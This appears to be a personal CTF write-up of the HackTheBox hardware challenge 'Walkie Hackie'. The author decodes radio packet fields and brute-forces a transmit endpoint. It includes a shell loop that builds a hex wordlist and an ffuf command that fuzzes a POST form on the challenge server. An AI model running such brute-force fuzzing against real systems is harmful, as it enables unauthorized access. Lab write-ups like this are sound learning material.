---
title: "Walkie Hackie Challenge"
date: 2025-03-05 00:00:00
categories: [Hardware]
tags: [Hardware,Challenges,HackTheBox]
---

# Walkie Hackie

- Challenge description

![image.png](images/HTB/Hardware/walkie_hackie/image.png)

- it’s analog communication , it make 2 devices communicate over specific frequency
- now it’s radio data so we have to open it with signal analyzer.
- i tried to view the frequency domain using audacity but nothing
- let’s investigate the web app

![image.png](images/HTB/Hardware/walkie_hackie/image%201.png)

- let’s upload the files

![image.png](images/HTB/Hardware/walkie_hackie/image%202.png)

![image.png](images/HTB/Hardware/walkie_hackie/image%203.png)

```jsx
aaaaaaaa 73214693 a2ff84
aaaaaaaa 73214693 a1ff14
aaaaaaaa 73214693 b2ff24
aaaaaaaa 73214693 b1ff57
```

- the architecture of sent data  `aaaaaaaa` it’s start of data and payload is `73214693` and third and fourth sector are addresses
- all of that doesn’t matter , i think we have to brute force , so now let’s find the static parts and there is only dynamic parts that we will exploit
- let’s generate combinations

```jsx
for i in {0..9} {a..f}; do for j in {0..9} {a..f}; do echo $i$j; done; done > brute_force
```

![image.png](images/HTB/Hardware/walkie_hackie/image%204.png)

- this the request , let’s try to brute force with `ffuf`

```jsx
ffuf -u 'http://94.237.63.49:33549/transmit' -X POST -d 'pa=aaaaaaaa&sw=73214693&pl=FUZZ_1ffFUZZ_2' -H 'Content-Type: application/x-www-form-urlencoded' -w brute_force:FUZZ_1 -w brute_force:FUZZ_2 -fs 2831 -x http://localhost:8080
```

- after brute forcing

![image.png](images/HTB/Hardware/walkie_hackie/image%205.png)

- note: i found that any id ends with `f9` is valid

![image.png](images/HTB/Hardware/walkie_hackie/image%206.png)

